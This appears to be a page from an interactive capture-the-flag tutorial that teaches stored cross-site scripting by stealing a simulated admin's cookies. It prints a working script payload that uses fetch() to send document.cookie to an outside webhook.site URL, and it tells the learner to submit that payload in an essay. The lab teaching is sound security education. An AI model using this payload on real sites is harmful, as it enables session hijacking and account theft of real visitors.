@@ -1,0 +1,17 @@
+<img src="/static/img/martinsactually2.png" style="width: 32px; height: auto; margin-right: 8px;"><b>Mārtiņš</b>
+<div style="max-width: 60vw;">
+    <p>Though we've discovered a vulnerability, there still lies the problem of actually obtaining the flag. In many CTF tasks, this will simply often come down to two things - experience and guesswork. Sometimes you will just have to try things until one of them finally nets you progress.</p>
+    <p>In this case, though, to save both of our times - one frequent method of obtaining a flag in cross-site scripting tasks is to try and obtain "cookies" from the "admin" (in our case, this would be Kibi, who presumably visits any essay we submit). The idea is that we submit javascript code that, when visited, gets the visitor's cookies and sends it so some website where it may be viewed.</p>
+    <p>Let's see what that code could look like:</p>
+    <code>
+        &lt;script&gt;<br>
+        &nbsp;&nbsp;&nbsp;fetch(&quot;https://webhook.site/118ab35f-8558-4e0a-8829-b7fee98d9c24?&quot; + document.cookie);<br>
+        &lt;/script&gt;<br>
+    </code>
+    <p>Remember our good old <span style="color: gray;">fetch()</span> command? Much like the <span style="color: gray;">alert(1)</span> command being immediately executed, if we submit this, whoever visits our website will have the <span style="color: gray;">fetch</span> command executed!</p>
+    <p>In the previous task, we dwelved a bit into submitting data using the <span style="color: gray;">GET</span> method (where you visit something like <span style="color: gray;">/buy?product=hat&price=5</span>, with the values after the question mark being data) - this fetch request is doing something very similar!
+        It also has a question mark followed by data, except the data being sent is <span style="color: gray;">document.cookie</span>, which is essentially all the cookies your browser has for the current website.</p>
+    <p>Finally, we have <span style="color: gray;">webhook.site/118ababunchofletters</span> - this is a website you can use to "catch" fetch requests and see the results. Simply head to <span style="color: gray;">webhook.site</span> and it'll automatically give you a unique URL to use. Any requests sent to that URL will appear on the <span style="color: gray;">webhook.site</span> site</p>
+    <p>With all of that combined, the effect is pretty simple - whenever this code executes, the visitor's cookies are sent to the given URL, which in our case is <span style="color: gray;">webhook.site</span>! All that's left is to submit it and hope that someone visits it.</p>
+    <p><span style="color:lightgreen">Submit an essay with malicious javascript code and obtain the cookies of Kibi!</span></p>
+</div>
